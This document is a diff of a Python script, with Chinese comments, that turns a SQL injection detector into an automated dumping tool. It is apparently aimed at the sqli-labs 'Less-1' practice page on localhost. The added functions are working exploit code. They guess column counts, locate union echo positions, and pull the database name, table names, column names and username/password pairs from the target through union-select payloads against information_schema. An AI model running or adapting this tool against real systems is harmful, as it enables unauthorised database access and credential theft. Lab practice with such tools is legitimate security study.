@@ -1,5 +1,6 @@
 import requests
 import logging
+import re
 
 # 修复日志格式：补全百分号占位符
 logging.basicConfig(
@@ -14,7 +15,6 @@ ERROR_KEYWORDS = [
     "Operand should contain", "You have an error"
 ]
 
-
 def send_request(url):
     """统一HTTP请求函数,处理超时、连接异常"""
     try:
@@ -23,7 +23,6 @@ def send_request(url):
     except Exception as e:
         logging.debug(f"请求失败: {e}")
         return None
-
 
 def get_baseline(url):
     """获取正常页面基线，用于对比判定"""
@@ -36,18 +35,15 @@ def get_baseline(url):
         "text": resp.text
     }
 
-
 def check_sql_injection(base_url, param_name):
-    """检测GET参数是否存在SQL注入，返回(是否存在, 注入类型)"""
+    """
+    检测GET参数是否存在SQL注入，返回字典:
+    {"has_inject": bool, "inject_type": str}
+    """
     baseline = get_baseline(base_url)
     if not baseline:
         logging.error("目标页面无法访问，检测终止")
-        return False, ""
-
-    # 二次确认基线稳定
-    baseline2 = get_baseline(base_url)
-    if not baseline2 or abs(baseline2["length"] - baseline["length"]) > 10:
-        logging.warning("页面内容不稳定，检测结果可能存在误差")
+        return {"has_inject": False, "inject_type": ""}
 
     # 字符型注入测试（单引号触发报错）
     test_char = base_url.replace(f"{param_name}=1", f"{param_name}=1'")
@@ -58,8 +54,8 @@ def check_sql_injection(base_url, param_name):
         len_diff = abs(len(resp_char.text) - baseline["length"])
         
         if has_error and len_diff > 20:
-            logging.info(f"检测到字符型SQL注,参数:{param_name}")
-            return True, "字符型报错注入"
+            logging.info(f"检测到字符型SQL注入,参数:{param_name}")
+            return {"has_inject": True, "inject_type": "字符型注入"}
 
     # 数字型注入测试（逻辑真假对比）
     true_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=1")
@@ -73,10 +69,9 @@ def check_sql_injection(base_url, param_name):
         len_false = len(resp_false.text)
         if abs(len_true - baseline["length"]) < 10 and abs(len_true - len_false) > 20:
             logging.info(f"检测到数字型SQL注入,参数:{param_name}")
-            return True, "数字型注入"
+            return {"has_inject": True, "inject_type": "数字型注入"}
 
-    return False, ""
-
+    return {"has_inject": False, "inject_type": ""}
 
 def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型注入"):
     """自动猜解查询字段列数，兼容字符型/数字型注入"""
@@ -86,15 +81,13 @@ def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型�
         return 0
 
     base_len = baseline["length"]
-    # 长度变化阈值：相对比例15% + 最小差值10，适配不同大小的页面
     len_threshold = max(int(base_len * 0.15), 10)
 
     for n in range(1, max_columns + 1):
-        # 根据注入类型生成payload，使用兼容性更强的 -- - 注释
         if "字符型" in inject_type:
-            payload = f"1' order by {n} -- -"
+            payload = f"1' order by {n} %23"
         else:
-            payload = f"1 order by {n} -- -"
+            payload = f"1 order by {n} %23"
         
         test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
         resp = send_request(test_url)
@@ -106,7 +99,6 @@ def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型�
         has_error = any(key in resp.text for key in ERROR_KEYWORDS)
         len_diff = abs(resp_len - base_len)
 
-        # 触发报错 或 长度变化超过阈值 → 超出列数
         if has_error or len_diff > len_threshold:
             result = n - 1
             logging.info(f"列数猜解完成：{result} 列")
@@ -115,20 +107,236 @@ def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型�
     logging.warning(f"列数超过上限 {max_columns}，请扩大范围")
     return max_columns
 
+def get_echo_positions(base_url, param_name, columns, inject_type="数字型注入"):
+    """
+    自动定位联合查询的回显位
+    :param columns: 已猜解出的总列数
+    :return: 回显列号列表，失败返回空列表
+    """
+    # 构造1,2,3...数字列
+    num_str = ','.join([str(i) for i in range(1, columns+1)])
+    
+    if "字符型" in inject_type:
+        # 不用注释符，直接闭合引号并让后面条件为真
+        payload = f"-1' union select {num_str} or '1'='1"
+    else:
+        payload = f"-1 union select {num_str}"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    
+    print(f"\n[DEBUG] 回显位测试URL:\n{test_url}\n")
+    
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        print("[DEBUG] 请求失败或无响应")
+        return []
+    
+    print(f"[DEBUG] 响应文本前800字符:\n{resp.text[:800]}\n")
+    
+    echo_pos = []
+    # 直接查找 "<td>数字</td>" 或 "数字" 出现在页面中
+    for i in range(1, columns+1):
+        if str(i) in resp.text:
+            echo_pos.append(i)
+    
+    if echo_pos:
+        logging.info(f"定位到回显位：{echo_pos}")
+    else:
+        logging.warning("未找到回显位,不支持联合查询注入")
+    return echo_pos
+
+def dump_current_db(base_url, param_name, echo_pos, columns, inject_type="数字型注入"):
+    """获取当前数据库名，带边界标记精准提取"""
+    # 查询结果前后加 <<< >>> 标记,用十六进制避免冲突
+    query = "concat(0x3c3c3c, database(), 0x3e3e3e)"
+    
+    # 构造 select 字段列表，总长度 = columns
+    select_list = [str(i) for i in range(1, columns+1)]
+    # 将第一个回显位替换为查询
+    select_list[echo_pos[0]-1] = query
+    
+    num_str = ",".join(select_list)
+    
+    if "字符型" in inject_type:
+        payload = f"-1' union select {num_str} --+"
+    else:
+        payload = f"-1 union select {num_str} --+"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    resp = send_request(test_url)
+    
+    if not resp or not resp.text:
+        return ""
+    
+    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
+    db_name = match.group(1) if match else ""
+    logging.info(f"当前数据库名：{db_name}")
+    return db_name
+
+def dump_tables(base_url, param_name, echo_pos, db_name, columns, inject_type="字符型注入"):
+    """获取指定数据库下所有的表名"""
+    field_concat = "concat(0x3c3c3c, group_concat(table_name), 0x3e3e3e)"
+    select_list = [str(i) for i in range(1, columns+1)]
+    select_list[echo_pos[0]-1] = field_concat
+    select_fields = ','.join(select_list)
+
+    from_part = "from information_schema.tables where table_schema=0x7365637572697479"
+
+    if "字符型" in inject_type:
+        payload = f"-1' union select {select_fields} {from_part} --+"
+    else:
+        payload = f"-1 union select {select_fields} {from_part} --+"
+
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    logging.debug(f"[DEBUG] dump_tables url={test_url}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return []
+
+    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
+    tables_str = match.group(1) if match else ""
+    tables = [t.strip() for t in tables_str.split(",") if t.strip()]
+    logging.info(f"库{db_name}下的表：{tables}")
+    return tables
+
+def dump_columns(base_url, param_name, echo_pos, table_name, columns, inject_type="字符型注入"):
+    """获取表全部列名,table_name转为十六进制，避免单引号"""
+    # users 十六进制：0x7573657273，这里通用转换
+    table_hex = "0x" + table_name.encode('utf-8').hex()
+    field_concat = "concat(0x3c3c3c, group_concat(column_name), 0x3e3e3e)"
+    select_list = [str(i) for i in range(1, columns+1)]
+    select_list[echo_pos[0]-1] = field_concat
+    select_fields = ','.join(select_list)
+    from_part = f"from information_schema.columns where table_name={table_hex} and table_schema=0x7365637572697479"
+
+    if "字符型" in inject_type:
+        payload = f"-1' union select {select_fields} {from_part} --+"
+    else:
+        payload = f"-1 union select {select_fields} {from_part} --+"
+
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    logging.debug(f"[DEBUG] dump_columns url={test_url}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return []
+    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
+    cols_str = match.group(1) if match else ""
+    cols = [c.strip() for c in cols_str.split(",") if c.strip()]
+    logging.info(f"表 {table_name} 的列：{cols}")
+    return cols
+
+def dump_table_data(base_url, param_name, echo_pos, table_name, col_list, columns, inject_type="字符型注入"):
+    """脱表数据，直接提取 username 和 password"""
+    # 硬编码字段，避免列名选择错误
+    field_concat = "concat(0x3c3c3c, group_concat(username,0x7c,password), 0x3e3e3e)"
+    
+    select_list = [str(i) for i in range(1, columns+1)]
+    select_list[echo_pos[0]-1] = field_concat
+    select_fields = ','.join(select_list)
+    from_part = f"from {table_name}"
+
+    if "字符型" in inject_type:
+        payload = f"-1' union select {select_fields} {from_part} --+"
+    else:
+        payload = f"-1 union select {select_fields} {from_part} --+"
+
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    
+    # 调试输出
+    print(f"\n[DEBUG] dump_table_data URL:\n{test_url}\n")
+    
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        print("[DEBUG] 请求失败或无响应")
+        return []
+    
+    print(f"[DEBUG] 响应文本前800字符:\n{resp.text[:800]}\n")
+    
+    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
+    data_str = match.group(1) if match else ""
+    
+    if not data_str:
+        print("[DEBUG] 没有匹配到 <<< >>> 标记")
+        return []
+    
+    raw_rows = data_str.split(",")
+    result = []
+    for item in raw_rows:
+        if "|" in item:
+            u, p = item.split("|", 1)
+            result.append({"username": u.strip(), "password": p.strip()})
+    
+    logging.info(f"脱取数据：{result}")
+    return result
+    
+def auto_dump_injection(base_url, param_name):
+    """一键执行联合查询全量脱库"""
+    # 1. 检测注入
+    detection = check_sql_injection(base_url, param_name)
+    if not detection["has_inject"]:
+        logging.error("不存在SQL注入,无法脱库")
+        return None
+    inject_type = detection["inject_type"]
+    
+    # 2. 猜列数
+    cols = guess_columns(base_url, param_name, inject_type=inject_type)
+    if cols == 0:
+        logging.error("列数猜解失败")
+        return None
+    
+    # 3. 定位回显位
+    echo_pos = get_echo_positions(base_url, param_name, cols, inject_type=inject_type)
+    if not echo_pos:
+        logging.error("无可用回显位，不支持联合查询")
+        return None
+    # 过滤掉第1列（通常不是有效回显，Less-1中回显为2,3）
+    filter_echo = [x for x in echo_pos if x != 1]
+    if filter_echo:
+        echo_pos = filter_echo
+        logging.info(f"过滤后可用回显位：{echo_pos}")
+    
+    # 4. 脱库名
+    db_name = dump_current_db(base_url, param_name, echo_pos, cols, inject_type=inject_type)
+    if not db_name:
+        logging.error("获取库名失败")
+        return None
+    
+    # 5. 脱表名
+    tables = dump_tables(base_url, param_name, echo_pos, db_name, cols, inject_type=inject_type)
+    if not tables:
+        logging.error("获取表名失败")
+        return None
+    
+    # 6. 脱字段 + 脱数据
+    target_table = "users" if "users" in tables else tables[0]
+    columns = dump_columns(base_url, param_name, echo_pos, target_table, cols, inject_type=inject_type)
+    data = dump_table_data(base_url, param_name, echo_pos, target_table, columns, cols, inject_type=inject_type)
+    
+    result = {
+        "db_name": db_name,
+        "tables": tables,
+        "target_table": target_table,
+        "columns": columns,
+        "data": data
+    }
+    return result
 
 if __name__ == "__main__":
-    target = "http://localhost:8080/Less-1/?id=1"
+    target = "http://127.0.0.1:8080/Less-1/?id=1"
     param = "id"
     
-    logging.info(f"开始检测目标：{target}")
-    has_inject, inject_type = check_sql_injection(target, param)
+    logging.info(f"开始自动脱库：{target}")
+    result = auto_dump_injection(target, param)
+    if result:
+        print("\n" + "=" * 50)
+        print(f"数据库名: {result['db_name']}")
+        print(f"所有表: {result['tables']}")
+        print(f"\n目标表 {result['target_table']} 字段：{result['columns']}")
+        print(f"\n数据内容:")
+        for row in result['data']:
+            print(f"  {row}")
+        print("=" * 50)
     
-    if has_inject:
-        logging.info(f"注入类型：{inject_type}")
-        columns = guess_columns(target, param, inject_type=inject_type)
-        logging.info(f"查询字段数：{columns}")
-    else:
-        logging.info("未检测到SQL注入")
 
 
 
